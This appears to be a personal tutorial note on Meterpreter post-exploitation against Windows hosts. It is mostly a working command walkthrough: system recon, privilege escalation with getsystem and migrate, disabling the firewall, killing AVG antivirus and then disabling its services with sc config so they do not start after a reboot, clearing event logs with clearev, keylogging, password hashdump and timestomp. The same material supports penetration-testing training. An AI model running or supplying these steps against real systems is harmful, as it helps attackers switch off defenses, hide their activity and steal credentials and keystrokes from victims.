# Meterpreter & Post-Exploitation

1. Understanding the victim better (recon)
2. Privilege Escalation (Exploitation)
3. Deleting Logs and Killing Monitoring Software (Post, covering tracks)
4. Collecting Data, Executing programs etc. (recon)
5. Backdoors and Rootkits (post)
6. Using victim as a pivot to hack deeper into the network (exploitation)

### Meterpreter Commands -  post recon

- sysinfo
- getuid
- getpid (current process id)
- ps (see all process)
- idletime (check if user is using the computer by checking their idletime)
- run checkvm (check if the sys is on vm or baremetal, post mt script)
- run get_env (check what environment)
- routes
- ifconfig
- run get_application_list
- run scraper (big info dump to your pc @ msf/logs/scripts/scraper/<IP><datecreated>)
- run winenum (Also info gathering but more on system, like firewall config)

- run (to see what mt posts script you can run)

### 2.PE
example: minishare program has an exploit in metasploit (search it in metasploit)

- getuid
- getsystem -h to learn how to use
- rev2self to revert
- migrate <pid> (after getting privilege, you can migrate to any processes)

### 3.Detecting Logs and shutdown AV

- execute -f cmd.exe -c -H (to get a win cmd, -c to channelize it, -H to hidden from view, remote computer wont come up cmd)
  - interact 1 (talk to channel 1) [Inside win cmd]
  - netsh firewall show opmode (check firewall situation) [Inside win cmd]
  - netsh firewall set opmode mode= DISABLE (disable firewall)
  - netsh firewall show opmode to check again
 
- run killav (kill the antivirus) might not always work
- Lets do it Manually in the target machine
  - now lets do it with a cmd in the machine `execute -f cmd.exe -c -H` `interact 2` (this time it will be on channel 2)
  - `tasklist` to see all ask, avg is what we want to look for which is antivirus
  - `tasklist /SVC` to catergorize them by respondence and look at what is the root of all avg services, /SVC being 'run it along with services hosted by them
  - `tasklist /SVC | find /I "avg"` to see service further down the service tree (all of the service with "avg"), /I being non case sensitive
  - `taskkill /?` to see how to use taskkill, `/?` is like `-h` in linux
  - after that we run `taskkill /F /IM "avg*"`, /F being force, /IM is the Image Name or the process/executable that you want to kill, and we want to kill everything starting with avg with`*` wildcard indicating behind it
  - Nice, let's `tasklist /SVC | find /I "avg"` to see what is still there. And the kill didn't work, it killed some but not the root program started those services again
  - `net stop <service>` to stop specific task, so `net stop avgwd`, and it says it cannot be stopped
  - lets see the attributes of these 2 services `sc queryex avgwd` & `sc queryex AVGIDSAgent`, `sc` is service config manager, `queryex` is query extended, meaning it show more info than `query`
  - It says 'Not stoppable and not pausable, but accepts shutdown', so we can disable it next time when reboot, it is just not stoppable after it booted up
  - `sc config avgwd start= disabled` & `sc config AVGIDSAgent start= disabled`, it should show something like `[SC] ChangeServiceConfig SUCCESS` so it is disabled and now we just need to reboot
- `exit` the win cmd, back to the meterpreter shell. Lets `reboot` the computer
- Let's `exploit` the system again to get back in after it reboot, and `execute -f cmd.exe -c -H` `interact 1` and `tasklist /SVC | find /I "avg"` and the root service isn't there!!!
- Now lets' finally kill the task `taskkill /F /IM "avg*"` and mess with the system!
- Let's mess the log files up so people have no idea whatsup. In meterpreter, run `clearev` to clear event logs

### Stdapi and Priv Extensions, Extensions in Meterpreter

- normal ls and mkdir commands are from the stdapi, and allow us to run these commands in windows or any machine.
- type `?` in meterpreter to view it

- For all keyloggin `keyscan_dump` `keyscan_start` `keyscan_stop` `screenshot`, windows session architecture needs to be understook
  - Windows session is to allow multiple users to log into same computer, however, session 0 is separated for system and critical service, main user is session 0
  - under a session, there are window stations, while multiple stations are possible and there, WinSta0 is the one control desktops, which is the GUI we interact with and most likely use
  - while sessions are run isolate, programs like task managers can reach session 0
  - So the take away is that when running a keylogger, we must be on the same session and same station with the program that is taking in the user input (must be WinSta0, since WinSta0 takes the User Input)
  - So `getdesktop` to see what session and window station we are in
  - `ps` to show all processes, `migrate` to a process you are sure is on a WinSta 0, basically any that has a GUI and interactive
- `Hashdump` for dumping hashes
- `timestomp -h` to see how to modify the time of the file
